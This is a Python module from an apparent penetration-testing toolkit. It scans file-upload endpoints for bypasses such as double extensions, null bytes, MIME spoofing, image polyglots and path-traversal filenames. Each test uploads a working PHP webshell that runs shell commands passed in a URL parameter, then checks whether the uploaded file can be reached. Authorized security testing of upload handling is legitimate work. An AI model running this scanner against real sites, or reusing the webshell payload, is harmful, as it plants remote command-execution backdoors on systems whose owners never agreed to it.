#!/usr/bin/python3
"""
Upload Scanner — test file upload endpoints for bypass vulnerabilities.

Tests: extension bypass (double ext, null byte, MIME mismatch),
content-type spoofing, polyglots (GIF89a header), path traversal in filename,
and checks if uploaded files are executable/accessible.

Usage:
  ../.venv/bin/python3 modules/upload_scanner.py -u https://target.com/upload -f upload_field
"""
import argparse
import os
import tempfile

import requests
import urllib3

from core.colors import bold, underline, end, red, yellow, green, run, good, bad, info, tab
from core.auth_gate import preflight

urllib3.disable_warnings()

UA = {"User-Agent": "Mozilla/5.0"}
MARKER = b"PP_UPLOAD_CANARY_7x4z"

# ── test payloads ──────────────────────────────────────────────────────────

def _php_webshell(marker: bytes = MARKER) -> bytes:
    return b"<?php echo '" + marker + b"'; system($_GET['c']); ?>"

def _gif_polyglot(payload: bytes) -> bytes:
    return b"GIF89a" + payload

def _png_polyglot(payload: bytes) -> bytes:
    # Minimal valid PNG header + PHP payload appended
    png_sig = bytes([0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A])
    return png_sig + payload

TESTS = [
    # (label, filename, content_type, content_fn)
    ("PHP extension",          "shell.php",            "application/octet-stream", lambda: _php_webshell()),
    ("PHP5 extension",         "shell.php5",           "application/octet-stream", lambda: _php_webshell()),
    ("PHTML extension",        "shell.phtml",          "application/octet-stream", lambda: _php_webshell()),
    ("Double extension",       "shell.php.jpg",        "image/jpeg",               lambda: _php_webshell()),
    ("Double ext reversed",    "shell.jpg.php",        "image/jpeg",               lambda: _php_webshell()),
    ("Null byte (PHP bypass)", "shell.php%00.jpg",     "image/jpeg",               lambda: _php_webshell()),
    ("MIME spoofed (image/gif)","shell.php",           "image/gif",                lambda: _php_webshell()),
    ("GIF polyglot",           "shell.gif",            "image/gif",                lambda: _gif_polyglot(_php_webshell())),
    ("PNG polyglot",           "shell.png",            "image/png",                lambda: _png_polyglot(_php_webshell())),
    ("Uppercase extension",    "shell.PHP",            "application/octet-stream", lambda: _php_webshell()),
    ("ASP extension",          "shell.asp",            "application/octet-stream", lambda: b"<% Response.Write(\"" + MARKER + b"\") %>"),
    ("ASPX extension",         "shell.aspx",           "application/octet-stream", lambda: _php_webshell()),
    ("JSP extension",          "shell.jsp",            "application/octet-stream", lambda: _php_webshell()),
    ("SVG with script",        "shell.svg",            "image/svg+xml",
     lambda: b'<svg><script>' + MARKER + b'</script></svg>'),
    ("Path traversal filename","../../../tmp/shell.php","application/octet-stream",lambda: _php_webshell()),
    ("Long filename",          "A"*230+".php",         "application/octet-stream", lambda: _php_webshell()),
]


def _do_upload(url: str, field: str, filename: str,
               content_type: str, content: bytes,
               extra_fields: dict | None = None,
               cookies: dict | None = None) -> requests.Response | None:
    files = {field: (filename, content, content_type)}
    data  = extra_fields or {}
    try:
        return requests.post(url, files=files, data=data,
                             headers=UA, cookies=cookies or {},
                             timeout=15, verify=False, allow_redirects=True)
    except Exception as e:
        return None


def _check_accessible(base_url: str, uploaded_path: str) -> tuple[bool, str]:
    """Try to fetch the uploaded file and check if MARKER appears in response."""
    try_urls = [
        uploaded_path,
        base_url.rstrip("/") + "/" + uploaded_path.lstrip("/"),
    ]
    for u in try_urls:
        if not u.startswith("http"): continue
        try:
            r = requests.get(u, headers=UA, timeout=8, verify=False)
            if MARKER in r.content:
                return True, u
        except Exception:
            pass
    return False, ""


def scan(url: str, field: str, extra_fields: dict | None = None,
         cookies: dict | None = None) -> list[dict]:
    print(f"{run} {bold}Upload Scanner{end} → {url}  field='{field}'\n")
    results = []

    for label, filename, ct, content_fn in TESTS:
        content = content_fn() if callable(content_fn) else content_fn
        r = _do_upload(url, field, filename, ct, content, extra_fields, cookies)
        if r is None:
            print(f"  {bad} {label:<35} ERR")
            continue

        # Heuristic: upload accepted if status 2xx and no obvious rejection
        rejected_keywords = ["invalid", "not allowed", "forbidden", "rejected",
                             "error", "fail", "only", "accept"]
        body_lower = r.text.lower()
        rejected = (r.status_code >= 400 or
                    any(kw in body_lower for kw in rejected_keywords))

        # Try to extract uploaded file path from response
        uploaded_url = ""
        for pattern in [r'https?://[^\s"\'<>]+', r'/[^\s"\'<>]*(?:upload|file|media)[^\s"\'<>]*']:
            import re
            m = re.search(pattern, r.text)
            if m:
                uploaded_url = m.group()
                break

        accessible, acc_url = False, ""
        if uploaded_url and not rejected:
            accessible, acc_url = _check_accessible(url, uploaded_url)

        sym = f"{red}ACCEPTED" if not rejected else f"{green}BLOCKED "
        acc = f"  {red}→ ACCESSIBLE at {acc_url}{end}" if accessible else ""
        print(f"  {'✓' if not rejected else '✗'} {label:<40} [{r.status_code}] {sym}{end}{acc}")
        results.append({
            "label": label, "filename": filename,
            "status": r.status_code, "rejected": rejected,
            "accessible": accessible, "url": acc_url,
        })

    accepted = [r for r in results if not r["rejected"]]
    accessible = [r for r in results if r["accessible"]]
    print(f"\n{bold}Summary:{end} {len(accepted)}/{len(results)} uploads accepted, "
          f"{len(accessible)} accessible.")
    if accessible:
        print(f"{bad} {red}{bold}Potential webshell upload — verify manually!{end}")
    return results


def main():
    parser = argparse.ArgumentParser(description="Test file upload endpoints for bypass vulnerabilities")
    parser.add_argument("-u",     dest="url",    required=True, help="Upload endpoint URL")
    parser.add_argument("-f",     dest="field",  default="file", help="Form field name (default: file)")
    parser.add_argument("--extra",dest="extra",  nargs="*", metavar="key=value",
                        help="Extra POST fields (e.g. --extra csrf=abc)")
    parser.add_argument("--cookie",dest="cookie",default="",
                        help="Session cookie string")
    args = parser.parse_args()

    preflight('upload_scanner', args.url, active=True)

    extra = {}
    if args.extra:
        for kv in args.extra:
            k, _, v = kv.partition("=")
            extra[k] = v

    cookies = {}
    if args.cookie:
        for part in args.cookie.split(";"):
            k, _, v = part.strip().partition("=")
            cookies[k] = v

    scan(args.url, args.field, extra or None, cookies or None)


if __name__ == "__main__":
    main()
